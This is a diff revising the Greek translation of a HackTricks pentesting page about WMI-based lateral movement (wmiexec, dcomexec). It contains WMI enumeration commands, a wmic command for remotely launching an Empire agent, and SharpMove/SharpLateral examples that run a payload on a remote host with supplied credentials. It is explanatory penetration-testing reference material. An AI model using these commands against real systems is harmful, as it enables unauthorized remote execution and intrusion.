@@ -2,18 +2,18 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Πώς λειτουργεί
+## Επεξήγηση του τρόπου λειτουργίας
 
 Μπορούν να ανοίξουν processes σε hosts όπου είναι γνωστά το username και είτε το password είτε το hash, μέσω της χρήσης του WMI. Οι εντολές εκτελούνται μέσω WMI από το Wmiexec, παρέχοντας μια semi-interactive εμπειρία shell.
 
-**dcomexec.py:** Χρησιμοποιώντας διαφορετικά DCOM endpoints, αυτό το script προσφέρει ένα semi-interactive shell παρόμοιο με το wmiexec.py, αξιοποιώντας συγκεκριμένα το ShellBrowserWindow DCOM object. Προς το παρόν υποστηρίζει τα MMC20. Application, Shell Windows και Shell Browser Window objects. (πηγή: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))<sup>[[2]](#references)</sup>
+**dcomexec.py:** Χρησιμοποιώντας διαφορετικά DCOM endpoints, αυτό το script προσφέρει ένα semi-interactive shell παρόμοιο με το `wmiexec.py`. Η επιλεγμένη τιμή `-object` καθορίζει το endpoint· τα υποστηριζόμενα objects περιλαμβάνουν τα `MMC20.Application`, `ShellWindows` και `ShellBrowserWindow`, με το τελευταίο να παρέχει την τεχνική Shell Browser Window που επισημαίνεται στο αρχικό walkthrough.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ## Βασικές αρχές του WMI
 
 ### Namespace
 
-Με δομή ιεραρχίας τύπου directory, το top-level container του WMI είναι το \root, κάτω από το οποίο οργανώνονται επιπλέον directories, τα οποία αναφέρονται ως namespaces.<sup>[[1]](#references)</sup>
-Εντολές για την καταχώριση των namespaces:
+Δομημένο σε ιεραρχία τύπου directory, το top-level container του WMI είναι το \root, κάτω από το οποίο οργανώνονται πρόσθετα directories, τα οποία αναφέρονται ως namespaces.<sup>[[1]](#references)</sup>
+Εντολές για την εμφάνιση των namespaces:
 ```bash
 # Retrieval of Root namespaces
 gwmi -namespace "root" -Class "__Namespace" | Select Name
@@ -24,20 +24,20 @@ Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | s
 # Listing of namespaces within "root\cimv2"
 Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
 ```
-Οι κλάσεις μέσα σε ένα namespace μπορούν να απαριθμηθούν χρησιμοποιώντας:
+Οι κλάσεις μέσα σε ένα namespace μπορούν να παρατεθούν χρησιμοποιώντας:
 ```bash
 gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
 gwmi -Namespace "root/microsoft" -List -Recurse
 ```
-### **Κλάσεις**
+### **Classes**
 
-Η γνώση του ονόματος μιας κλάσης WMI, όπως `win32_process`, και του namespace στο οποίο βρίσκεται είναι κρίσιμη για οποιαδήποτε λειτουργία WMI.  
-Commands για την εμφάνιση κλάσεων που ξεκινούν με `win32`:
+Η γνώση ενός ονόματος WMI class, όπως το win32_process, και του namespace στο οποίο βρίσκεται είναι κρίσιμη για οποιαδήποτε λειτουργία WMI.
+Εντολές για την εμφάνιση των classes που ξεκινούν με `win32`:
 ```bash
 Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
 gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
 ```
-Κλήση μιας κλάσης:
+Επίκληση μιας κλάσης:
 ```bash
 # Defaults to "root/cimv2" when namespace isn't specified
 Get-WmiObject -Class win32_share
@@ -45,7 +45,7 @@ Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpCompute
 ```
 ### Μέθοδοι
 
-Μπορούν να εκτελεστούν μέθοδοι, οι οποίες αποτελούν μία ή περισσότερες εκτελέσιμες συναρτήσεις των κλάσεων WMI.
+Μπορούν να εκτελεστούν μέθοδοι, οι οποίες είναι μία ή περισσότερες εκτελέσιμες συναρτήσεις των κλάσεων WMI.
 ```bash
 # Class loading, method listing, and execution
 $c = [wmiclass]"win32_share"
@@ -61,7 +61,7 @@ Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Descrip
 
 ### WMI Service Status
 
-Εντολές για την επαλήθευση ότι η υπηρεσία WMI λειτουργεί:
+Εντολές για την επαλήθευση ότι η υπηρεσία WMI είναι λειτουργική:
 ```bash
 # WMI service status check
 Get-Service Winmgmt
@@ -76,7 +76,7 @@ net start | findstr "Instrumentation"
 Get-WmiObject -ClassName win32_operatingsystem | select * | more
 Get-WmiObject win32_process | Select Name, Processid
 ```
-Για τους επιτιθέμενους, το WMI είναι ένα ισχυρό εργαλείο για την απαρίθμηση ευαίσθητων δεδομένων σχετικά με συστήματα ή domains.<sup>[[1]](#references)</sup>
+Για τους επιτιθέμενους, το WMI αποτελεί ισχυρό εργαλείο για την απαρίθμηση ευαίσθητων δεδομένων σχετικά με συστήματα ή domains.<sup>[[1]](#references)</sup>
 ```bash
 wmic computerystem list full /format:list
 wmic process list /format:list
@@ -89,15 +89,15 @@ wmic sysaccount list /format:list
 
 ### **Χειροκίνητη απομακρυσμένη αναζήτηση WMI**
 
-Η stealthy αναγνώριση των local admins σε ένα απομακρυσμένο μηχάνημα και των συνδεδεμένων χρηστών μπορεί να επιτευχθεί μέσω συγκεκριμένων WMI queries. Το `wmic` υποστηρίζει επίσης την ανάγνωση από ένα αρχείο κειμένου για την ταυτόχρονη εκτέλεση εντολών σε πολλαπλούς nodes.<sup>[[1]](#references)</sup>
+Η stealthy αναγνώριση των local admins σε ένα απομακρυσμένο μηχάνημα και των συνδεδεμένων χρηστών μπορεί να επιτευχθεί μέσω συγκεκριμένων WMI queries. Το `wmic` υποστηρίζει επίσης την ανάγνωση από ένα αρχείο κειμένου για την ταυτόχρονη εκτέλεση εντολών σε πολλαπλούς κόμβους.<sup>[[1]](#references)</sup>
 
 Για την απομακρυσμένη εκτέλεση μιας διεργασίας μέσω WMI, όπως η ανάπτυξη ενός Empire agent, χρησιμοποιείται η ακόλουθη δομή εντολής, με την επιτυχή εκτέλεση να υποδεικνύεται από return value "0":<sup>[[1]](#references)</sup>
 ```bash
 wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
 ```
-Αυτή η διαδικασία αναδεικνύει τη δυνατότητα του WMI για remote execution και system enumeration, επισημαίνοντας τη χρησιμότητά του τόσο για system administration όσο και για penetration testing.
+Αυτή η διαδικασία επιδεικνύει τη δυνατότητα του WMI για απομακρυσμένη εκτέλεση και απαρίθμηση συστημάτων, αναδεικνύοντας τη χρησιμότητά του τόσο για τη διαχείριση συστημάτων όσο και για το penetration testing.
 
-## Αυτόματα εργαλεία
+## Αυτόματα Εργαλεία
 
 - [**SharpLateral**](https://github.com/mertdas/SharpLateral):
 ```bash
@@ -115,13 +115,12 @@ SharpMove.exe action=query computername=remote.host.local query="select * from w
 SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
 SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
 ```
-- Θα μπορούσες επίσης να χρησιμοποιήσεις το **Impacket `wmiexec`**.
+- Μπορείτε επίσης να χρησιμοποιήσετε το **Impacket's `wmiexec`**.
 
 
-## Αναφορές
+## References
 
-- [1] [Χρήση διαπιστευτηρίων για τον έλεγχο Windows Boxes - Μέρος 3 (WMI και WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
-- [2] [Οδηγός για αρχάριους στο Impacket Tool Kit - Μέρος 1](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
-
-
+- [1] [Χρήση Credentials για την Κατάληψη Windows Boxes - Μέρος 3 (WMI και WinRM)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/)
+- [2] [Fortra Impacket – dcomexec.py](https://github.com/fortra/impacket/blob/master/examples/dcomexec.py)
+- [3] [Οδηγός Αρχαρίων για το Impacket Tool Kit, Μέρος 1 – Hacking Articles (Internet Archive)](https://web.archive.org/web/20190822180831/https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/)
 {{#include ../../banners/hacktricks-training.md}}
